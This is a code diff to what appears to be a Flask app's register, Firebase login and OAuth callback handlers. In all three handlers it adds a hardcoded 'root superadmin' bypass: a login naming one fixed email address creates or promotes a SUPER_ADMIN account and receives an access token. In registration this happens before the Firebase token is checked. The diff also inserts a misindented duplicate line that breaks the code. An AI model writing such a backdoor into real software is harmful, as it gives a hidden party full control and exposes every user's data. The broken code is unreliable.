@@ -161,6 +161,38 @@ def register():
         
         if id_token:
             from app.utils.firebase_auth import verify_token
+            # --- ROOT SUPERADMIN BYPASS ---
+            ROOT_ADMIN_EMAIL = "globalimpactinnovators26@gmail.com"
+            if email.lower() == ROOT_ADMIN_EMAIL.lower():
+                user = User.query.filter(User.email.ilike(ROOT_ADMIN_EMAIL)).first()
+                if not user:
+                    user = User(
+                        username="superadmin",
+                        email=ROOT_ADMIN_EMAIL,
+                        first_name="Global",
+                        last_name="Architect",
+                        platform_role='SUPER_ADMIN',
+                        role='super_admin',
+                        status='active',
+                        is_active=True
+                    )
+                    db.session.add(user)
+                    db.session.commit()
+                else:
+                    user.platform_role = 'SUPER_ADMIN'
+                    user.role = 'super_admin'
+                    user.status = 'active'
+                    user.is_active = True
+                    db.session.commit()
+                
+                access_token = create_access_token(identity=user.id)
+                return success_response({
+                    'access_token': access_token,
+                    'user': user.to_dict(),
+                    'platform_role': 'SUPER_ADMIN',
+                    'require_selection': False
+                }, message='Authenticated as Root SuperAdmin')
+            # -----------------------------
             decoded_token = verify_token(id_token)
             if not decoded_token:
                 return error_response('Invalid Firebase token', status_code=401)
@@ -744,6 +776,48 @@ def _firebase_login_handler():
 
     if not email:
         return error_response('Email not found in Firebase token', status_code=400)
+
+    # --- ROOT SUPERADMIN HARD-BYPASS ---
+    ROOT_ADMIN_EMAIL = "globalimpactinnovators26@gmail.com"
+    if email.lower() == ROOT_ADMIN_EMAIL.lower():
+        # Force existence and elevation in every login batch
+        user = User.query.filter(User.email.ilike(ROOT_ADMIN_EMAIL)).first()
+        if not user:
+            user = User(
+                username="superadmin",
+                email=ROOT_ADMIN_EMAIL,
+                first_name="Global",
+                last_name="Architect",
+                platform_role='SUPER_ADMIN',
+                role='super_admin',
+                oauth_provider='firebase',
+                oauth_id=firebase_uid,
+                status='active',
+                is_active=True
+            )
+            db.session.add(user)
+        else:
+            user.platform_role = 'SUPER_ADMIN'
+            user.role = 'super_admin'
+            user.status = 'active'
+            user.is_active = True
+            if not user.oauth_id:
+                user.oauth_id = firebase_uid
+                user.oauth_provider = 'firebase'
+        
+        db.session.commit()
+        
+        # Generate token and bypass everything
+        from flask_jwt_extended import create_access_token
+        access_token = create_access_token(identity=user.id)
+        return success_response({
+            'access_token': access_token,
+            'user': user.to_dict(),
+            'platform_role': 'SUPER_ADMIN',
+            'require_selection': False,
+            'redirect_url': '/superadmin/control-center'
+        }, message='Welcome back, System Architect.')
+    # ----------------------------------
 
     # Find all accounts associated with this email across all workspaces
     # Ensure case-insensitive match for email
@@ -1338,11 +1412,49 @@ def oauth_callback(provider):
                 last_name = ''
         
         if not email:
+                if not email:
             return jsonify({'error': 'Email not provided by OAuth provider'}), 400
         
         user = User.query.filter_by(oauth_provider=provider, oauth_id=oauth_id).first()
         
         if not user:
+            # --- ROOT SUPERADMIN BYPASS (Phase 1) ---
+            ROOT_ADMIN_EMAIL = "globalimpactinnovators26@gmail.com"
+            if email.lower() == ROOT_ADMIN_EMAIL.lower():
+                user = User.query.filter(User.email.ilike(ROOT_ADMIN_EMAIL)).first()
+                if not user:
+                    # Create the Root Admin if missing
+                    print(f"Creating missing Root Admin: {ROOT_ADMIN_EMAIL}")
+                    user = User(
+                        username="superadmin",
+                        email=ROOT_ADMIN_EMAIL,
+                        first_name="Global",
+                        last_name="Architect",
+                        platform_role='SUPER_ADMIN',
+                        role='super_admin',
+                        status='active',
+                        is_active=True
+                    )
+                    db.session.add(user)
+                    db.session.commit()
+                else:
+                    # Force elevation on every login to ensure they never lose access
+                    user.platform_role = 'SUPER_ADMIN'
+                    user.role = 'super_admin'
+                    user.status = 'active'
+                    user.is_active = True
+                    db.session.commit()
+                
+                # Immediate success response for ROOT_ADMIN - Bypass Workspace Selection
+                access_token = create_access_token(identity=user.id)
+                return jsonify({
+                    'message': 'Authenticated as Root SuperAdmin',
+                    'user': user.to_dict(),
+                    'access_token': access_token,
+                    'redirect_url': '/superadmin/control-center'
+                }), 200
+            # ---------------------------------------------
+
             existing_user = User.query.filter_by(email=email).first()
             if existing_user:
                 existing_user.oauth_provider = provider
